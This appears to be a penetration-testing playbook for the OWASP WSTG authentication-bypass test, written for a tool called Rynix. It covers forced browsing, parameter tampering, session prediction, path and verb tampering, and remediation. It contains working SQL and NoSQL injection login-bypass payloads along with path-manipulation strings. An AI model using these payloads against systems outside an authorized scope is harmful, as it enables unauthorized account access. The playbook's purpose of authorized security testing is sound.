---
id: WSTG-ATHN-04
title: Testing for Bypassing Authentication Schema
category: Authentication
severity_range: High-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema
---

# WSTG-ATHN-04: Testing for Bypassing Authentication Schema

## Summary

Authentication bypass vulnerabilities allow attackers to gain access to protected resources or functionality without valid credentials. These flaws can arise from forced browsing to unprotected pages, parameter manipulation, session ID prediction, SQL injection in login forms, or flawed authentication logic. A successful bypass gives an attacker unauthorized access, potentially with elevated privileges.

## Test Objectives

- Determine if it is possible to access protected resources without authentication
- Test for direct URL access (forced browsing) to authenticated pages
- Identify parameter manipulation that bypasses authentication checks
- Test for SQL injection and other injection-based authentication bypass
- Check for session ID prediction or fixation vulnerabilities

## Prerequisites

- Target application has authentication mechanisms
- Knowledge of protected URLs and resources (from crawling or documentation)
- At least one valid account for comparison testing
- Docker pentest container is capturing traffic

## Test Steps

### Step 1: Test Forced Browsing to Protected Resources

**CLI Actions:**
1. Log in and browse the entire application to capture all authenticated URLs
2. Use `curl` to extract all URLs accessed while authenticated
3. Log out and use `curl` to request protected pages without any session:
   ``
   GET /dashboard HTTP/1.1
   Host: target.com
   ``
4. Test commonly protected endpoints:
   ``
   GET /admin HTTP/1.1
   Host: target.com

   GET /api/users HTTP/1.1
   Host: target.com

   GET /account/settings HTTP/1.1
   Host: target.com
   ``
5. Check if the response returns the protected content, a redirect to login, or a 403 error
6. Use `curl` with pattern `dashboard|admin|account|profile|settings|manage` to build a complete list of protected endpoints

### Step 2: Test Parameter Manipulation

**CLI Actions:**
1. Use `save to manual-review file` with a login request for modification
2. Use `curl` to test authentication bypass via parameter manipulation:
   ``
   POST /login HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=anything&authenticated=true
   ``
3. Test adding bypass parameters:
   ``
   POST /login HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=anything&admin=1&auth=true&success=1
   ``
4. Test modifying response-based authentication (if client-side logic exists):
   ``
   GET /api/authenticate?user=admin&bypass=true HTTP/1.1
   Host: target.com
   ``
5. Test changing HTTP method:
   ``
   HEAD /admin/dashboard HTTP/1.1
   Host: target.com

   OPTIONS /admin/dashboard HTTP/1.1
   Host: target.com
   ``

### Step 3: Test SQL Injection Authentication Bypass

**CLI Actions:**
1. Use `save to manual-review file` to prepare the login request
2. Use `curl` to test SQL injection payloads in the username field:
   ``
   POST /login HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded

   username=admin'--&password=anything
   ``
3. Test additional SQL injection bypass payloads:
   ``
   username=admin' OR '1'='1'--&password=anything
   username=' OR 1=1--&password=anything
   username=admin'/*&password=anything
   username=' UNION SELECT 1,'admin','password'--&password=anything
   ``
4. Test NoSQL injection if the application uses MongoDB or similar:
   ``
   POST /login HTTP/1.1
   Host: target.com
   Content-Type: application/json

   {"username":{"$gt":""},"password":{"$gt":""}}
   ``
5. Use `curl --data-urlencode` to encode payloads that contain special characters

### Step 4: Test Session ID Prediction

**CLI Actions:**
1. Use `curl` to perform multiple login requests and collect session tokens:
   ``
   POST /login HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded

   username=testuser&password=validpassword
   ``
2. Collect 20+ session IDs from the Set-Cookie headers
3. Use `base64 -d` to decode session tokens if they appear base64-encoded
4. Analyze tokens for patterns:
   - Sequential numeric components
   - Timestamp-based values
   - Predictable encoding of username or user ID
5. If patterns are found, use `curl` to test a predicted session:
   ``
   GET /dashboard HTTP/1.1
   Host: target.com
   Cookie: session=<predicted_session_id>
   ``

### Step 5: Test Authentication Logic Flaws

**CLI Actions:**
1. Use `curl` to test multi-step authentication bypass by skipping steps:
   ``
   GET /login/step3 HTTP/1.1
   Host: target.com
   Cookie: session=<session_from_step1>
   ``
2. Test if removing authentication tokens from requests still allows access:
   ``
   GET /protected-resource HTTP/1.1
   Host: target.com
   ``
3. Test with empty or null authentication values:
   ``
   GET /api/data HTTP/1.1
   Host: target.com
   Authorization: Bearer
   Cookie: session=
   ``
4. Test HTTP verb tampering to bypass method-based restrictions:
   ``
   PATCH /admin/users HTTP/1.1
   Host: target.com
   ``
5. Use `rynix_plugin_run('template-scan')` to review any authentication bypass findings from the template-scan plugin

### Step 6: Test Path Traversal Authentication Bypass

**CLI Actions:**
1. Use `curl` to test URL manipulation to bypass authentication filters:
   ``
   GET /admin/../admin/dashboard HTTP/1.1
   Host: target.com

   GET /./admin/dashboard HTTP/1.1
   Host: target.com

   GET /admin/dashboard;.js HTTP/1.1
   Host: target.com

   GET /%61dmin/dashboard HTTP/1.1
   Host: target.com
   ``
2. Use `curl --data-urlencode` to test double-encoding bypasses:
   ``
   GET /%252fadmin/dashboard HTTP/1.1
   Host: target.com
   ``
3. Test case variation:
   ``
   GET /ADMIN/dashboard HTTP/1.1
   Host: target.com

   GET /Admin/Dashboard HTTP/1.1
   Host: target.com
   ``

## Payloads

### SQL Injection Auth Bypass Payloads
```
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
admin'--
admin' #
') OR ('1'='1'--
' UNION SELECT 1,'admin','anything'--
' OR ''='
admin' AND '1'='1
' OR 1=1 LIMIT 1--
```

### NoSQL Injection Auth Bypass Payloads
```json
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":"admin","password":{"$regex":".*"}}
{"username":{"$in":["admin","administrator"]},"password":{"$gt":""}}
```

### Forced Browsing Paths
```
/admin
/admin/dashboard
/admin/users
/administrator
/console
/management
/api/admin
/internal
/debug
/config
/backup
```

### Path Manipulation Payloads
```
/admin/dashboard
/admin/../admin/dashboard
/./admin/dashboard
/admin/dashboard;.css
/admin/dashboard%00.html
/%61%64%6d%69%6e/dashboard
/ADMIN/dashboard
```

## Detection Criteria

A finding should be logged when:
- Protected pages are accessible without authentication
- SQL injection allows authentication bypass
- Parameter manipulation grants access without valid credentials
- Session IDs are predictable and allow session hijacking
- Multi-step authentication can be bypassed by skipping steps
- Path manipulation or verb tampering bypasses authentication filters
- Empty or null authentication tokens are accepted

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| SQL injection allows complete authentication bypass | Critical |
| Forced browsing grants access to admin functionality | Critical |
| Session ID prediction allows account takeover | High |
| Parameter manipulation bypasses authentication | High |
| Multi-step authentication steps can be skipped | High |
| Path traversal bypasses authentication filter | High |
| HTTP verb tampering allows access to restricted methods | Medium |
| Empty authentication tokens accepted for non-sensitive endpoints | Medium |

## Remediation

- Implement server-side authentication checks on every protected resource
- Use parameterized queries or ORM to prevent SQL injection
- Generate cryptographically random session IDs with sufficient entropy
- Enforce multi-step authentication flows server-side (verify each step completed)
- Normalize and canonicalize URLs before applying authentication filters
- Deny by default: require explicit access grants rather than relying on URL patterns
- Implement centralized authentication middleware rather than per-route checks
- Use allowlists for HTTP methods on each endpoint
- Log and alert on authentication bypass attempts
- Perform regular authentication testing as part of CI/CD

## References

- [OWASP Testing Guide - Bypassing Authentication Schema](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-288: Authentication Bypass Using an Alternate Path or Channel](https://cwe.mitre.org/data/definitions/288.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V2 Authentication — credential storage, lockout, MFA.
- V3 Session Management — session binding and rotation.

## CWE references

- CWE-307: Improper Restriction of Excessive Authentication Attempts
- CWE-798: Use of Hard-coded Credentials

## Rynix tooling

- Primary tools: ``auth_login``, ``http_probe``, ``compare_role_response``, ``record_finding``

## Test focus

- Test password policy, lockout, and MFA bypass paths.
- Verify tokens/sessions invalidated on logout and password change.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

